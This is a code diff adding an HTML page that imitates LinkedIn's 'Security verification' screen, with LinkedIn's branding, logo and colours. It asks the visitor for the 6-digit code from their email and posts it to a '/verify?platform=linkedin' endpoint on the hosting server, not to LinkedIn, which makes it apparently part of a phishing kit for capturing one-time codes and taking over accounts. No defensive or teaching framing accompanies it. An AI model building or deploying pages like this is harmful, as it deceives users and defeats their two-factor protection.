@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LinkedIn - Security Verification</title>
+    <style>
+        :root {
+            --linkedin-blue: #0A66C2;
+            --linkedin-blue-hover: #004182;
+            --background-color: #f3f2ef;
+            --text-color: rgba(0, 0, 0, 0.9);
+            --secondary-text: rgba(0, 0, 0, 0.6);
+            --border-color: rgba(0, 0, 0, 0.15);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", "Fira Sans", Ubuntu, Oxygen, "Oxygen Sans", Cantarell, "Droid Sans", "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Lucida Grande", Helvetica, Arial, sans-serif;
+            background: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.5;
+        }
+
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 24px 16px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .linkedin-logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .linkedin-logo svg {
+            width: 84px;
+            height: 21px;
+            fill: var(--linkedin-blue);
+        }
+
+        .verification-box {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: var(--text-color);
+        }
+
+        p {
+            color: var(--secondary-text);
+            margin-bottom: 24px;
+            font-size: 14px;
+        }
+
+        .otp-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 16px;
+        }
+
+        .otp-input:focus {
+            outline: none;
+            border-color: var(--linkedin-blue);
+            box-shadow: 0 0 0 1px var(--linkedin-blue);
+        }
+
+        button {
+            background: var(--linkedin-blue);
+            color: white;
+            border: none;
+            border-radius: 24px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 16px;
+            transition: background-color 0.2s;
+        }
+
+        button:hover {
+            background: var(--linkedin-blue-hover);
+        }
+
+        .resend {
+            text-align: center;
+            font-size: 14px;
+            color: var(--secondary-text);
+        }
+
+        .resend a {
+            color: var(--linkedin-blue);
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .resend a:hover {
+            text-decoration: underline;
+        }
+
+        #timer {
+            color: var(--secondary-text);
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="linkedin-logo">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 84 21" fill="#0a66c2">
+                <g>
+                    <path d="M12.5 2.75a1.75 1.75 0 101.8 1.75 1.75 1.75 0 00-1.8-1.75zM11 8h3v10h-3zM22.34 8h-3.24v4.75A2.75 2.75 0 0116.35 15h-.1v3a5.49 5.49 0 005.38-5.38V8zM31.5 8h-3.24v4.75A2.75 2.75 0 0125.51 15h-.1v3a5.49 5.49 0 005.38-5.38V8zM45 8h-3v10h3zM43.5 2.75a1.75 1.75 0 101.75 1.75A1.75 1.75 0 0043.5 2.75zM37 8h-2.66v-3h-3V8h-2v3h2v4.75A2.75 2.75 0 0034.09 15h2.57v3h-2.57a5.49 5.49 0 01-5.38-5.38V11h-2V8h2V5h3v3H37zM82 14.25A2.75 2.75 0 0179.25 17H72a5.49 5.49 0 01-5.38-5.38V8h3v3.75A2.75 2.75 0 0172.37 14h6.38a5.49 5.49 0 005.38-5.38V8h3v6.25z"></path>
+                </g>
+            </svg>
+        </div>
+        <div class="verification-box">
+            <h1>Security verification</h1>
+            <p>We sent a verification code to your email. Enter the 6-digit code below to continue.</p>
+            
+            <form action="/verify?platform=linkedin" method="POST" id="otpForm">
+                <input type="text" class="otp-input" name="otp" maxlength="6" pattern="[0-9]{6}" placeholder="Enter 6-digit code" required>
+                <button type="submit">Submit</button>
+            </form>
+            
+            <div class="resend">
+                <span id="timer">Resend code in: 30s</span><br>
+                <a href="#" id="resendLink" style="display: none;">Send new code</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Timer functionality
+        let timeLeft = 30;
+        const timerElement = document.getElementById('timer');
+        const resendLink = document.getElementById('resendLink');
+
+        const updateTimer = () => {
+            if (timeLeft > 0) {
+                timerElement.textContent = `Resend code in: ${timeLeft}s`;
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                timerElement.style.display = 'none';
+                resendLink.style.display = 'inline';
+            }
+        };
+
+        updateTimer();
+
+        resendLink.addEventListener('click', (e) => {
+            e.preventDefault();
+            timeLeft = 30;
+            timerElement.style.display = 'inline';
+            resendLink.style.display = 'none';
+            updateTimer();
+        });
+
+        // Only allow numeric input
+        const otpInput = document.querySelector('.otp-input');
+        otpInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+        });
+
+        // Form submission handling
+        const form = document.getElementById('otpForm');
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const otp = document.querySelector('.otp-input').value;
+            
+            // Submit form and handle response
+            fetch('/verify?platform=linkedin', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({ otp: otp })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.status === 'success' && data.redirect_url) {
+                    window.location.href = data.redirect_url;
+                } else {
+                    throw new Error(data.error || 'Unknown error occurred');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html> 
